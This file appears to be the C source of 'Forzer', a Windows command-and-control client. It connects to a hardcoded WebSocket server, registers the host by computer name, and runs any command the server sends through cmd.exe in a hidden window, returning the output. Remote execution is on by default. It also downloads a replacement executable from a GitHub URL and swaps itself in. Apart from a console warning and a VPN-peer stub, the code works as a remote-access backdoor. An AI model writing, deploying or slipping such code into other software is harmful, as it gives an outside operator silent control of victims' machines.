#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <urlmon.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")

#define FORZER_UPDATE_URL \
    "https://raw.githubusercontent.com/Peter211231231231232131/ForzerC2/master/Forzer.exe"

/* Control-plane endpoint. Override with FORZER_SERVER=ws://host:port. */
#define DEFAULT_SERVER "wss://forzerc2.onrender.com"

/* ------------------------------------------------------------------ */
/* Self-update                                                        */
/* ------------------------------------------------------------------ */

static int do_update(void) {
    char self_path[MAX_PATH];
    char tmp_path[MAX_PATH];
    char bak_path[MAX_PATH];

    if (!GetModuleFileNameA(NULL, self_path, MAX_PATH)) {
        fprintf(stderr, "error: GetModuleFileName failed (%lu)\n", GetLastError());
        return 1;
    }

    char temp_dir[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, temp_dir) ||
        !GetTempFileNameA(temp_dir, "frz", 0, tmp_path)) {
        fprintf(stderr, "error: GetTempFileName failed (%lu)\n", GetLastError());
        return 1;
    }

    const char *url = getenv("FORZER_UPDATE_URL");
    if (!url || !*url) url = FORZER_UPDATE_URL;

    printf("downloading update from %s\n", url);
    HRESULT hr = URLDownloadToFileA(NULL, url, tmp_path, 0, NULL);
    if (FAILED(hr)) {
        fprintf(stderr, "error: download failed (hr=0x%lx)\n", hr);
        DeleteFileA(tmp_path);
        return 1;
    }

    snprintf(bak_path, MAX_PATH, "%s.bak", self_path);
    DeleteFileA(bak_path);
    if (!MoveFileExA(self_path, bak_path, MOVEFILE_REPLACE_EXISTING)) {
        fprintf(stderr, "error: could not rename current exe (%lu)\n", GetLastError());
        DeleteFileA(tmp_path);
        return 1;
    }

    if (!MoveFileExA(tmp_path, self_path, MOVEFILE_REPLACE_EXISTING)) {
        fprintf(stderr, "error: could not install update (%lu)\n", GetLastError());
        MoveFileExA(bak_path, self_path, MOVEFILE_REPLACE_EXISTING);
        DeleteFileA(tmp_path);
        return 1;
    }

    printf("update installed: %s\n", self_path);
    printf("previous version kept as: %s\n", bak_path);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Control-plane client (WebSocket over raw Winsock)                  */
/* ------------------------------------------------------------------ */

#define WS_GUID "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

/* Remote-command state. Execution defaults ON but can be disabled with
   FORZER_ALLOW_REMOTE=0 (no flag needed). */
static int g_allow_remote = 1;
static SOCKET g_sock = INVALID_SOCKET;

/* wss (TLS) transport handles (WinHTTP) */
static HINTERNET g_ws = NULL, g_ws_req = NULL, g_ws_conn = NULL, g_ws_sess = NULL;

static int tr_send(const char *data, int len);
static int tr_recv(char *out, int cap);

static void base64(const BYTE *in, int n, char *out) {
    static const char t[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i, o = 0;
    for (i = 0; i + 2 < n; i += 3) {
        unsigned v = (in[i] << 16) | (in[i + 1] << 8) | in[i + 2];
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = t[(v >> 6) & 63]; out[o++] = t[v & 63];
    }
    int rem = n - i;
    if (rem == 1) {
        unsigned v = in[i] << 16;
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = '='; out[o++] = '=';
    } else if (rem == 2) {
        unsigned v = (in[i] << 16) | (in[i + 1] << 8);
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = t[(v >> 6) & 63]; out[o++] = '=';
    }
    out[o] = 0;
}

static int sha1(const BYTE *data, DWORD len, BYTE out[20]) {
    HCRYPTPROV h;
    if (!CryptAcquireContext(&h, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return 0;
    HCRYPTHASH hh;
    if (!CryptCreateHash(h, CALG_SHA1, 0, 0, &hh)) { CryptReleaseContext(h, 0); return 0; }
    CryptHashData(hh, data, len, 0);
    DWORD s = 20;
    CryptGetHashParam(hh, HP_HASHVAL, out, &s, 0);
    CryptDestroyHash(hh);
    CryptReleaseContext(h, 0);
    return 1;
}

static int rng_bytes(BYTE *buf, int n) {
    HCRYPTPROV h;
    if (!CryptAcquireContext(&h, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return 0;
    int ok = CryptGenRandom(h, n, buf);
    CryptReleaseContext(h, 0);
    return ok;
}

static int sock_recv_n(SOCKET s, char *buf, int len) {
    int got = 0;
    while (got < len) {
        int r = recv(s, buf + got, len - got, 0);
        if (r <= 0) return 0;
        got += r;
    }
    return 1;
}

static int sock_send_all(SOCKET s, const char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int r = send(s, buf + sent, len - sent, 0);
        if (r <= 0) return 0;
        sent += r;
    }
    return 1;
}

static int ws_send_frame(SOCKET s, unsigned char opcode, const char *data, int len) {
    unsigned char hdr[10];
    int hl = 2;
    hdr[0] = 0x80 | opcode;
    BYTE mask[4];
    rng_bytes(mask, 4);
    if (len < 126) {
        hdr[1] = 0x80 | (unsigned char)len;
    } else if (len < 65536) {
        hdr[1] = 0x80 | 126;
        hdr[2] = (unsigned char)(len >> 8);
        hdr[3] = (unsigned char)len;
        hl = 4;
    } else {
        hdr[1] = 0x80 | 127;
        for (int i = 0; i < 8; i++) hdr[2 + i] = (unsigned char)((long long)len >> (8 * (7 - i)));
        hl = 10;
    }
    if (!sock_send_all(s, (char *)hdr, hl)) return 0;
    if (!sock_send_all(s, (char *)mask, 4)) return 0;
    char *masked = malloc(len > 0 ? len : 1);
    if (!masked) return 0;
    for (int i = 0; i < len; i++) masked[i] = data[i] ^ mask[i & 3];
    int ok = sock_send_all(s, masked, len);
    free(masked);
    return ok;
}

static int ws_recv(SOCKET s, char *out, int cap) {
    unsigned char h[2];
    if (!sock_recv_n(s, (char *)h, 2)) return -1;
    int opcode = h[0] & 0x0f;
    int masked = h[1] & 0x80;
    long long len = h[1] & 0x7f;
    if (len == 126) {
        unsigned char e[2];
        if (!sock_recv_n(s, (char *)e, 2)) return -1;
        len = (e[0] << 8) | e[1];
    } else if (len == 127) {
        unsigned char e[8];
        if (!sock_recv_n(s, (char *)e, 8)) return -1;
        len = 0;
        for (int i = 0; i < 8; i++) len = (len << 8) | e[i];
    }
    unsigned char mkey[4];
    if (masked && !sock_recv_n(s, (char *)mkey, 4)) return -1;
    if (len > cap - 1) {
        long long left = len; char tmp[512];
        while (left > 0) {
            int c = (int)(left > sizeof(tmp) ? sizeof(tmp) : left);
            if (!sock_recv_n(s, tmp, c)) return -1;
            left -= c;
        }
        return -1;
    }
    if (!sock_recv_n(s, out, (int)len)) return -1;
    if (masked) for (long long i = 0; i < len; i++) out[i] ^= mkey[i & 3];
    out[len] = 0;

    if (opcode == 0x8) return -1;
    if (opcode == 0x9) {
        ws_send_frame(s, 0xA, out, (int)len);
        return ws_recv(s, out, cap);
    }
    if (opcode == 0xA) return ws_recv(s, out, cap);
    if (opcode != 0x1) return ws_recv(s, out, cap);
    return (int)len;
}

/* ------------------------------------------------------------------ */
/* wss (TLS) transport via WinHTTP                                    */
/* ------------------------------------------------------------------ */

static int wss_handshake(const char *host, int port, const char *path) {
    wchar_t whost[256], wpath[512];
    if (!MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 256)) return 1;
    if (!MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 512)) return 1;

    g_ws_sess = WinHttpOpen(L"Forzer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_ws_sess) return 1;
    g_ws_conn = WinHttpConnect(g_ws_sess, whost, (INTERNET_PORT)port, 0);
    if (!g_ws_conn) { WinHttpCloseHandle(g_ws_sess); g_ws_sess = NULL; return 1; }
    g_ws_req = WinHttpOpenRequest(g_ws_conn, L"GET", wpath, NULL,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!g_ws_req) return 1;

    BYTE keyb[16];
    rng_bytes(keyb, 16);
    char keyb64[32];
    base64(keyb, 16, keyb64);
    char hdr[256];
    snprintf(hdr, sizeof(hdr),
             "Upgrade: websocket\r\nConnection: Upgrade\r\n"
             "Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: %s\r\n", keyb64);
    wchar_t whdr[512];
    if (!MultiByteToWideChar(CP_UTF8, 0, hdr, -1, whdr, 512)) return 1;
    if (!WinHttpAddRequestHeaders(g_ws_req, whdr, -1, WINHTTP_ADDREQ_FLAG_ADD))
        return 1;
    if (!WinHttpSendRequest(g_ws_req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            NULL, 0, 0, 0)) return 1;
    if (!WinHttpReceiveResponse(g_ws_req, NULL)) return 1;

    g_ws = WinHttpWebSocketCompleteUpgrade(g_ws_req, 0);
    if (!g_ws) return 1;
    WinHttpCloseHandle(g_ws_req);
    g_ws_req = NULL;
    return 0;
}

static int tr_send(const char *data, int len) {
    if (g_ws) {
        DWORD r = WinHttpWebSocketSend(g_ws, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                                       (PVOID)data, (DWORD)len);
        return (r == ERROR_SUCCESS) ? len : -1;
    }
    return ws_send_frame(g_sock, 0x1, data, len) ? len : -1;
}

static int tr_recv(char *out, int cap) {
    if (g_ws) {
        DWORD bytesRead = 0, closeStatus = 0;
        WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
        DWORD r = WinHttpWebSocketReceive(g_ws, out, (DWORD)cap, &bytesRead, &type);
        if (r != ERROR_SUCCESS) return -1;
        if (type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) return -1;
        out[bytesRead] = 0;
        return (int)bytesRead;
    }
    return ws_recv(g_sock, out, cap);
}

static const char *json_str(const char *s, const char *key, char *out, int outsz) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(s, pat);
    if (!p) return NULL;
    p += strlen(pat);
    while (*p && *p != ':') p++;
    if (!*p) return NULL;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') return NULL;
    p++;
    int i = 0;
    while (*p && *p != '"' && i < outsz - 1) {
        if (*p == '\\' && p[1]) {
            p++;
            char c = *p;
            if (c == 'n') out[i++] = '\n';
            else if (c == 't') out[i++] = '\t';
            else if (c == 'r') out[i++] = '\r';
            else if (c == '\\') out[i++] = '\\';
            else if (c == '"') out[i++] = '"';
            else { out[i++] = '\\'; if (i < outsz - 1) out[i++] = c; }
            p++;
        } else {
            out[i++] = *p++;
        }
    }
    out[i] = 0;
    return out;
}

static void json_escape(const char *in, char *out, int cap) {
    int i = 0;
    for (; *in && i < cap - 2; in++) {
        if (*in == '"' || *in == '\\') { out[i++] = '\\'; out[i++] = *in; }
        else if (*in == '\n') { out[i++] = '\\'; out[i++] = 'n'; }
        else if (*in == '\r') { out[i++] = '\\'; out[i++] = 'r'; }
        else if (*in == '\t') { out[i++] = '\\'; out[i++] = 't'; }
        else out[i++] = *in;
    }
    out[i] = 0;
}

static void apply_peer(const char *id, const char *name, const char *ip, const char *pubkey) {
    printf("[peer] %s (%s) ip=%s pubkey=%s\n", name, id, ip, pubkey);
    /* TODO: add peer to the local wireguard-nt adapter. */
}

static void for_each_peer(const char *json,
                          void (*cb)(const char *, const char *, const char *, const char *)) {
    const char *p = strstr(json, "\"peers\"");
    if (!p) return;
    p = strchr(p, '[');
    if (!p) return;
    p++;
    while (*p && *p != ']') {
        if (*p == '{') {
            const char *end = p;
            int depth = 0;
            while (*end) {
                if (*end == '{') depth++;
                else if (*end == '}') { depth--; if (depth == 0) { end++; break; } }
                end++;
            }
            char obj[2048];
            int n = (int)(end - p);
            if (n >= (int)sizeof(obj)) n = (int)sizeof(obj) - 1;
            memcpy(obj, p, n);
            obj[n] = 0;
            char id[64], name[64], ip[64], pb[512];
            json_str(obj, "id", id, sizeof(id));
            json_str(obj, "name", name, sizeof(name));
            json_str(obj, "ip", ip, sizeof(ip));
            json_str(obj, "pubkey", pb, sizeof(pb));
            if (id[0]) cb(id, name, ip, pb);
            p = end;
        } else {
            p++;
        }
    }
}

/* Run a command via cmd.exe, capture stdout+stderr into out (cap bytes). */
static int run_command(const char *cmd, char *out, int cap) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = NULL;
    si.dwFlags = STARTF_USESTDHANDLES;
    char full[1024];
    snprintf(full, sizeof(full), "cmd.exe /c %s", cmd);
    if (!CreateProcessA(NULL, full, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return -1;
    }
    CloseHandle(hWrite);
    DWORD total = 0, r;
    char tmp[4096];
    while (ReadFile(hRead, tmp, sizeof(tmp), &r, NULL) && r > 0) {
        if (total + r < (DWORD)cap - 1) {
            memcpy(out + total, tmp, r);
            total += r;
        }
    }
    out[total] = 0;
    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)code;
}

/* Interactive prompt: type 'run <peer-id> <command>' to send. */
static DWORD WINAPI reader_thread(LPVOID lp) {
    (void)lp;
    char line[8192];
    while (fgets(line, sizeof(line), stdin)) {
        char *nl = strchr(line, '\n'); if (nl) *nl = 0;
        nl = strchr(line, '\r'); if (nl) *nl = 0;
        if (strncmp(line, "run ", 4) == 0) {
            char *rest = line + 4;
            char *sp = strchr(rest, ' ');
            if (!sp) { printf("usage: run <peer-id> <command>\n"); continue; }
            *sp = 0;
            char *peer = rest;
            char *cmd = sp + 1;
            BYTE rid[4];
            rng_bytes(rid, 4);
            static const char hx[] = "0123456789abcdef";
            char id[16];
            for (int k = 0; k < 4; k++) {
                id[k * 2] = hx[(rid[k] >> 4) & 15];
                id[k * 2 + 1] = hx[rid[k] & 15];
            }
            id[8] = 0;
            char esc[8192];
            json_escape(cmd, esc, sizeof(esc));
            char msg[9000];
            snprintf(msg, sizeof(msg),
                     "{\"type\":\"command\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\"}",
                     peer, id, esc);
             tr_send(msg, (int)strlen(msg));
            printf("sent command to %s (id=%s)\n", peer, id);
        } else if (strcmp(line, "exit") == 0 || strcmp(line, "quit") == 0) {
            break;
        } else if (line[0]) {
            printf("commands: run <peer-id> <command>  (exit to quit)\n");
        }
    }
    return 0;
}

static int connect_mode(const char *url, const char *setup_key, const char *name) {
    setvbuf(stdout, NULL, _IONBF, 0);

    const char *ar = getenv("FORZER_ALLOW_REMOTE");
    g_allow_remote = (ar == NULL || strcmp(ar, "0") != 0) ? 1 : 0;
    if (g_allow_remote)
        printf("WARNING: remote command execution is ENABLED on this host.\n");

    int is_wss = (strncmp(url, "wss://", 6) == 0);
    if (!is_wss && strncmp(url, "ws://", 5) != 0) {
        fprintf(stderr, "error: only ws:// and wss:// supported\n");
        return 1;
    }
    const char *auth = url + (is_wss ? 6 : 5);

    char host[256] = {0}, path[512] = {0};
    const char *slash = strchr(auth, '/');
    const char *colon = strchr(auth, ':');
    int port = is_wss ? 443 : 80;
    if (colon && (!slash || colon < slash)) {
        int hl = (int)(colon - auth);
        if (hl >= sizeof(host)) hl = sizeof(host) - 1;
        memcpy(host, auth, hl);
        port = atoi(colon + 1);
        if (slash) {
            int pl = (int)strlen(slash);
            if (pl >= sizeof(path)) pl = sizeof(path) - 1;
            memcpy(path, slash, pl);
        } else {
            path[0] = '/';
        }
    } else {
        int hl = slash ? (int)(slash - auth) : (int)strlen(auth);
        if (hl >= sizeof(host)) hl = sizeof(host) - 1;
        memcpy(host, auth, hl);
        if (slash) {
            int pl = (int)strlen(slash);
            if (pl >= sizeof(path)) pl = sizeof(path) - 1;
            memcpy(path, slash, pl);
        } else {
            path[0] = '/';
        }
    }
    if (path[0] == 0) path[0] = '/';

    printf("connecting to %s:%d%s (%s)\n", host, port, path, is_wss ? "wss" : "ws");

    if (is_wss) {
        if (wss_handshake(host, port, path) != 0) {
            fprintf(stderr, "error: wss handshake failed\n");
            return 1;
        }
    } else {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            fprintf(stderr, "error: WSAStartup failed\n");
            return 1;
        }
        struct addrinfo hints, *res = NULL;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        char portstr[16];
        snprintf(portstr, sizeof(portstr), "%d", port);
        if (getaddrinfo(host, portstr, &hints, &res) != 0) {
            fprintf(stderr, "error: cannot resolve %s\n", host);
            return 1;
        }
        SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (s == INVALID_SOCKET) {
            fprintf(stderr, "error: socket() failed\n");
            freeaddrinfo(res);
            return 1;
        }
        if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
            fprintf(stderr, "error: connect() failed (%d)\n", WSAGetLastError());
            closesocket(s);
            freeaddrinfo(res);
            return 1;
        }
        freeaddrinfo(res);
        g_sock = s;

        BYTE keyb[16];
        rng_bytes(keyb, 16);
        char keyb64[32];
        base64(keyb, 16, keyb64);
        char req[512];
        snprintf(req, sizeof(req),
                 "GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
                 "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                 "Sec-WebSocket-Version: 13\r\n\r\n",
                 path, host, port, keyb64);
        if (!sock_send_all(s, req, (int)strlen(req))) {
            fprintf(stderr, "error: handshake send failed\n");
            return 1;
        }
        char resp[1024];
        int rl = 0, r;
        while (rl < (int)sizeof(resp) - 1) {
            r = recv(s, resp + rl, 1, 0);
            if (r <= 0) break;
            rl += r;
            if (rl >= 4 && resp[rl - 4] == '\r' && resp[rl - 3] == '\n' &&
                resp[rl - 2] == '\r' && resp[rl - 1] == '\n')
                break;
        }
        resp[rl] = 0;
        if (strstr(resp, "101") == NULL) {
            fprintf(stderr, "error: handshake failed:\n%s\n", resp);
            return 1;
        }
        char *acc = strstr(resp, "sec-websocket-accept:");
        if (acc) {
            acc = strchr(acc, ':') + 1;
            while (*acc == ' ') acc++;
            char server_acc[128] = {0};
            int i = 0;
            while (*acc && *acc != '\r' && *acc != '\n' && i < 127) server_acc[i++] = *acc++;
            char concat[64];
            snprintf(concat, sizeof(concat), "%s%s", keyb64, WS_GUID);
            BYTE hash[20];
            sha1((BYTE *)concat, (DWORD)strlen(concat), hash);
            char expect[64];
            base64(hash, 20, expect);
            if (_stricmp(server_acc, expect) != 0)
                printf("warning: server accept mismatch (continuing)\n");
        }
    }

    printf("websocket connected\n");

    BYTE priv[32];
    rng_bytes(priv, 32);
    char pub_b64[64];
    base64(priv, 32, pub_b64);

    char reg[512];
    snprintf(reg, sizeof(reg),
             "{\"type\":\"register\",\"name\":\"%s\",\"pubkey\":\"%s\",\"setupKey\":\"%s\"}",
             name && *name ? name : "forzer", pub_b64,
             setup_key && *setup_key ? setup_key : "changeme");
    if (tr_send(reg, (int)strlen(reg)) <= 0) {
        fprintf(stderr, "error: register send failed\n");
        return 1;
    }
    printf("sent register; waiting for server...\n");
    printf("(type 'run <peer-id> <command>' to execute on a peer)\n");

    HANDLE thr = CreateThread(NULL, 0, reader_thread, NULL, 0, NULL);

    char buf[16384];
    for (;;) {
        int n = tr_recv(buf, sizeof(buf));
        if (n < 0) {
            printf("connection closed\n");
            break;
        }
        buf[n] = 0;
        char type[32] = {0};
        json_str(buf, "type", type, sizeof(type));
        if (strcmp(type, "registered") == 0) {
            char id[64] = {0}, ip[64] = {0}, err[128] = {0};
            json_str(buf, "id", id, sizeof(id));
            json_str(buf, "ip", ip, sizeof(ip));
            json_str(buf, "error", err, sizeof(err));
            if (err[0]) { fprintf(stderr, "register error: %s\n", err); break; }
            printf("registered: id=%s assigned-ip=%s\n", id, ip);
        } else if (strcmp(type, "map") == 0) {
            int count = 0;
            const char *p = strstr(buf, "\"peers\"");
            if (p) for (const char *q = strchr(p, '['); q && *q && *q != ']'; q++)
                if (*q == '{') count++;
            printf("map update: %d peer(s)\n", count);
            for_each_peer(buf, apply_peer);
        } else if (strcmp(type, "signal") == 0) {
            char from[64] = {0};
            json_str(buf, "from", from, sizeof(from));
            printf("[signal] from %s: %s\n", from, buf);
        } else if (strcmp(type, "command") == 0) {
            char from[64] = {0}, id[64] = {0}, cmd[8192] = {0};
            json_str(buf, "from", from, sizeof(from));
            json_str(buf, "id", id, sizeof(id));
            json_str(buf, "data", cmd, sizeof(cmd));
            if (!g_allow_remote) {
                printf("[command] REJECTED (remote exec disabled) from %s: %s\n", from, cmd);
                continue;
            }
            printf("[command] from %s: %s\n", from, cmd);
            static char out[32768];
            int rc = run_command(cmd, out, sizeof(out));
            char esc[66000];
            json_escape(out, esc, sizeof(esc));
            char res[68000];
            snprintf(res, sizeof(res),
                     "{\"type\":\"command-result\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\",\"rc\":%d}",
                     from, id, esc, rc);
            tr_send(res, (int)strlen(res));
            printf("[command] done (rc=%d, %d bytes)\n", rc, (int)strlen(esc));
        } else if (strcmp(type, "command-result") == 0) {
            char id[64] = {0}, data[32768] = {0}, rc[16] = {0};
            json_str(buf, "id", id, sizeof(id));
            json_str(buf, "data", data, sizeof(data));
            json_str(buf, "rc", rc, sizeof(rc));
            printf("RESULT (rc=%s):\n%s\n", rc, data);
        } else {
            printf("[msg] %s\n", buf);
        }
    }

    if (thr) {
        /* nudge the reader thread to exit, then reap */
        fclose(stdin);
        WaitForSingleObject(thr, 1000);
        CloseHandle(thr);
    }
    if (is_wss) {
        if (g_ws) {
            WinHttpWebSocketClose(g_ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
            WinHttpCloseHandle(g_ws);
            g_ws = NULL;
        }
        if (g_ws_conn) { WinHttpCloseHandle(g_ws_conn); g_ws_conn = NULL; }
        if (g_ws_sess) { WinHttpCloseHandle(g_ws_sess); g_ws_sess = NULL; }
    } else {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
        WSACleanup();
    }
    return 0;
}

int main(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--update") == 0 || strcmp(argv[i], "-u") == 0) {
            return do_update();
        }
    }

    const char *url = getenv("FORZER_SERVER");
    if (!url || !*url) url = DEFAULT_SERVER;
    const char *key = getenv("FORZER_SETUP_KEY");
    if (!key || !*key) key = "changeme";
    char name[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD nlen = sizeof(name);
    if (!GetComputerNameA(name, &nlen)) strcpy(name, "forzer");

    return connect_mode(url, key, name);
}
